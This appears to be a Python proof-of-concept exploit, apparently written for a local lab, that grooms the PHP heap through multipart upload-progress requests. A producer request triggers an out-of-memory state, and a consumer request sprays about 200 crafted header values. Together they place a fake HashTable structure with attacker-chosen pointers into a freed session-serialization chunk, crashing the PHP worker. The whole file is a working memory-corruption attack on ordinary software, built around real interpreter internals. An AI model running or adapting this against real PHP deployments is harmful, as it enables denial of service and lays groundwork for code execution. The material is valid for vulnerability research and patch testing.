#!/usr/bin/env python3
"""8083 CONTROLLED GROOM: fake BG(serialize).data on the freed 64-bin chunk.
Producer: 20x60KB-filename file parts (encode-OOM at 2M, BG(serialize) stale).
Consumer: DIFFERENT SID (avoid the leaked flock) + progress key + FILE part
whose OWN headers carry ~200 crafted values (len 62 => smart_str buffer 63B
=> 64-bin, raw bytes from offset 0 = fake php_serialize_data{HashTable}).
FILE_START update => php_session_encode => php_var_serialize_init reuses
stale freed chunk == our fake => zend_hash ops on 0x4242... => worker SEGV.
Observable: connection reset/empty + bias rotation."""
import socket, sys, time, re

HOST, PORT = "127.0.0.1", 8083
B = b"GLM619"
PROD_SID = "e" * 32
CONS_SID = "c" * 32

def part(name, body, filename=None, extra_headers=None):
    d = b"--" + B + b"\r\n" + b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    d += b"\r\n"
    for h in (extra_headers or []):
        d += h + b"\r\n"
    d += b"\r\n" + body + b"\r\n"
    return d

def pb(parts): return b"".join(parts) + b"--" + B + b"--\r\n"

def post_head(blen, keep=True):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\n"
            + ("Connection: keep-alive\r\n\r\n" if keep else "Connection: close\r\n\r\n")).encode()

class KA:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=20)
    def send(self, head, body=None, timeout=120):
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        buf = b""
        while True:
            he = buf.find(b"\r\n\r\n")
            if he >= 0:
                m = re.search(rb"Content-Length: (\d+)", buf[:he])
                if m and len(buf) >= he + 4 + int(m.group(1)):
                    return buf
            try:
                d = self.s.recv(65536)
            except socket.timeout:
                return buf + b"\n<TIMEOUT>"
            except ConnectionResetError:
                return buf + b"\n<RESET>"
            if not d:
                return buf + b"\n<EOF>"
            buf += d
    def close(self):
        try: self.s.close()
        except Exception: pass

def bias():
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.sendall(b"GET /lab/index.php?probe=base HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        s.settimeout(20)
        out = b""
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
        s.close()
        return out.split(b"\r\n\r\n", 1)[1].strip()
    except Exception as e:
        return f"ERR:{type(e).__name__}".encode()

def show(tag, r):
    i = r.find(b"\r\n\r\n")
    body = r[i+4:] if i >= 0 else r
    print(f"  {tag}: rawlen={len(r)} body[:160]={body[:160]!r}", flush=True)

# ---- fake php_serialize_data bytes (62-byte header VALUE) ----
# struct php_serialize_data { HashTable ht; uint32_t n; }  (~60B => 64 bin)
# HashTable aarch64: gc(8) u.flags(4) nTableMask(4) arData(8) nNumUsed(4)
#   nNumOfElements(4) nTableSize(4) nInternalPointer(4) nNextFreeElement(8)
#   pDestructor(8) => 56; +n(4)
def fake_sdata():
    b = bytearray()
    b += (2).to_bytes(4, "little")            # gc.refcount
    b += (0x0601).to_bytes(4, "little")       # gc.u.type_info (GC_ARRAY-ish)
    b += (0x00000000).to_bytes(4, "little")   # u.flags (0 => hash mode, not packed)
    b += (0xFFFFFFFE).to_bytes(4, "little")   # nTableMask = -2 (2 slots)
    b += (0x4242424242424242).to_bytes(8, "little")  # arData => SEGV read target
    b += (0).to_bytes(4, "little")            # nNumUsed
    b += (0).to_bytes(4, "little")            # nNumOfElements
    b += (2).to_bytes(4, "little")            # nTableSize
    b += (0).to_bytes(4, "little")            # nInternalPointer
    b += (0).to_bytes(8, "little")            # nNextFreeElement
    b += (0x4343434343434343).to_bytes(8, "little")  # pDestructor
    b += (0).to_bytes(4, "little")            # n
    assert len(b) == 60, len(b)
    return bytes(b) + b"\x00"                  # +NUL => 61.. pad value to len 62
FAKE = fake_sdata()
HDR_VALUE = FAKE + b"\x01"                     # 62 bytes total value

n_spray = int(sys.argv[1]) if len(sys.argv) > 1 else 200

b0 = bias()
print(f"bias BEFORE: {b0!r}", flush=True)

ka = KA()
# producer: encode-OOM
prod = [part(b"PHPSESSID", PROD_SID.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k")]
for i in range(20):
    prod.append(part(f"u{i}".encode(), b"x" * 100, filename=b"F" * 60000))
pp = pb(prod)
r1 = ka.send(post_head(len(pp)), pp)
show("producer", r1)

# consumer: different SID + key + FILE part with header-value spray
spray = [b"X-G: " + HDR_VALUE for _ in range(n_spray)]
cons = [part(b"PHPSESSID", CONS_SID.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
        part(b"u", b"y", filename=b"a.txt", extra_headers=spray)]
cp = pb(cons)
r2 = ka.send(post_head(len(cp)), cp)
show("consumer-GROOM", r2)
ka.close()

b1 = bias()
print(f"bias AFTER:  {b1!r}", flush=True)
print(f"SAME_WORKER={b0 == b1}", flush=True)
